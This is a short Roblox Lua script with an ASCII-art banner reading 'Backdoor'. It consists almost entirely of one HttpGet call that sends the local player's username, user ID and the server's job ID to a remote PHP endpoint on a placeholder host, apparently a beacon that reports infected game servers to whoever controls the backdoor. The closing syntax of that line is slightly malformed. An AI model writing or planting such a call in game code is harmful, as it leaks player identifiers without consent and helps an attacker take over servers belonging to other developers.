--[[
######                                                   
#     #   ##    ####  #    # #####   ####   ####  #####  
#     #  #  #  #    # #   #  #    # #    # #    # #    # 
######  #    # #      ####   #    # #    # #    # #    # 
#     # ###### #      #  #   #    # #    # #    # #####  
#     # #    # #    # #   #  #    # #    # #    # #   #  
######  #    #  ####  #    # #####   ####   ####  #    #  
                                                         
]]
game:HttpGet("https://example.com/bdc.php?username=" .. game:GetService("Players").LocalPlayer.Name .. "&userid=" .. game:GetService("Players").LocalPlayer.UserId .. "&jobid=" .. game.JobId ..")
    
